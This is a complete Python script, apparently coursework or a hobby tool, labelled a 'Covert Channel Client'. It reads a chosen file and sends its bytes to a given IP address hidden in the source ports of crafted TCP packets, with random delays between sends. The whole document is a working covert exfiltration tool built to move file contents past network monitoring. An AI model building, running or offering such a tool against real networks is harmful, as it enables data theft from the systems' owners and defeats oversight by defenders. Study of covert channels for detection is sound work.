import logging
# don't output warnings from scapy, kthx
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import IP, TCP, send
from random import randint
import argparse
import time
import os

# globals
global maxPort
global lastPosition
global fileSize
maxPort = 65535
asciiMax = 127
lastPosition = 0
fileSize = 0

# createPacketTwo - takes in two ASCII characters
# Turns both characters into binary strings, concatenates the strings
# and turns the result into an integer value. It then creates a TCP packet
# and sets the source port as the difference between 65535 and the integer.
# Returns a TCP packet created by scapy.
def createPacketTwo(char1, char2):
  # get the binary values of both chars without the binary string indicator
  binChar1 = bin(ord(char1))[2:].zfill(8)
  binChar2 = bin(ord(char2))[2:].zfill(8)
  print binChar1 + binChar2
  # get the integer value of the concatenated binary values
  intPortVal = int(binChar1 + binChar2, 2)
  print "bin value " + str((bin(intPortVal)))
  # craft the packet
  packet = IP(dst=args.destIp)/TCP(dport=80, sport=maxPort - intPortVal)
  return packet

# create a packet when we only have 1 character remaining in the file
# works exactly the same as createPacketTwo except we only have one character
# returns a TCP packet created by scapy.
def createPacketOne(char):
  # get the binary value of the character
  binChar = bin(ord(char))[2:].zfill(8)
  print binChar
  #get the integer value of that binary value
  intPortVal = int(binChar, 2)
  # craft the packet
  packet = IP(dst=args.destIp)/TCP(dport=80, sport=maxPort -intPortVal)
  return packet

# readOneByte - takes in a file descriptor of an open file
# accesses the global lastPosition variable, and seeks to that byte offset
# within the file.  Then, read one byte from the file and update the lastPosition.
# Returns the byte read from the file.
def readOneByte(fileDescriptor):
  global lastPosition
  fileDescriptor.seek(lastPosition)
  byte = fileDescriptor.read(1)
  lastPosition = fileDescriptor.tell()
  return byte

# sendPackets - loops through the file specified as a command line argument.
# Reads each byte from the file, calls the appropriate packet creation function
# and sends each packet.  Between each send there is a sleep for a randomized amount
# of time within a range, also set as a command line argument.
def sendPackets():
  global fileSize
  global lastPosition
  fileDescriptor = open(args.path, 'r')
  while lastPosition < fileSize:
    if lastPosition == fileSize - 1:
      # the next byte we read contains the last character in the file
      char = readOneByte(fileDescriptor)
      packet = createPacketOne(char)
    else:
      # there is at least 2 characters left in the file
      char1 = readOneByte(fileDescriptor)
      char2 = readOneByte(fileDescriptor)
      packet = createPacketTwo(char1, char2)

    # scapy send
    send(packet)
    print "sport: " + str(packet.sport)
    time.sleep(randint(1,int(args.sendInterval)))

# start of execution
parser = argparse.ArgumentParser(description='Covert Channel Client')
parser.add_argument('-p'
                   , '--path'
                   , dest='path'
                   , help='absolute path to file to watch.'
                   , required=True)
parser.add_argument('-d'
                   , '--destination'
                   , dest='destIp'
                   , help='IP address to covertly send data too.'
                   , required=True)
parser.add_argument('-i'
                   , '--interval'
                   , dest='sendInterval'
                   , help='Max interval to wait between sends, in seconds.'
                   , required=True)
args = parser.parse_args()
fileSize = os.path.getsize(args.path)
sendPackets()